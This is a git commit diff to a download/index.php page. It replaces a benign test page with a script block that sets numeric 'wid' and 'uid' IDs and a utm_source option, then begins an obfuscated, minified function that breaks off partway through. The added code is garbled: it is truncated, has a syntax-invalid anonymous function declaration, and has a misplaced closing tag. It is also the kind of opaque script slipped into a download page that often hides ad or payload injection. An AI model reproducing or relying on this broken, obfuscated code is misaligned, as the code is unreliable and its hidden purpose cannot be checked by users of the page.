6864b91b2cbe3e6a94cbb4032ef6567a027fa465
TRXTRC <TRXTRC@pm.me>
2025-09-04 13:23:19 +0300

    Update index.php

--- download/index.php
+++ download/index.php
@@ -1,39 +1,16 @@
-<?php
-// Set any necessary headers if needed (CSP, etc)
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Test Page</title>
-</head>
-<body>
-
-<!-- Your page content -->
-
-<script data-cfasync="false" type="text/javascript">
+<script type="text/javascript">
 //<![CDATA[
 var wid = '441868';
 var uid = '170625';
-var OPCIONES = { status: true, parameter: 'utm_source' };
+var OPCIONES={"status": true, "parameter":"utm_source"};
 //]]>
 </script>
-
-<script data-cfasync="false" type="text/javascript">
+<script type="text/javascript">
 //<![CDATA[
 
-// Sample completed function (your code was incomplete)
-(function() {
-    var urlParams = new URLSearchParams(window.location.search);
-    var paramValue = urlParams.get(OPCIONES.parameter);
-    if (OPCIONES.status && paramValue) {
-        console.log("UTM Source: " + paramValue);
-        // You can do more here: load a script, fire pixel, etc.
-    }
-})();
+ !function() { function () {}var u,e,i,nt, rt, ot, ct, at, st, ut, ht, ft, gt,xt, pt, Pt, mt, lt, vt, Ct, St, dt, bt, n, yt, kt, wt, Et, $t, Xt,_t, Yt, Bt, qt, Qt, zt, Vt, At, Jt, Ut, jt, Ot, r, Dt, Ft, G
 
 //]]>
-</script>
 
-</body>
-</html>
+-</script>
+
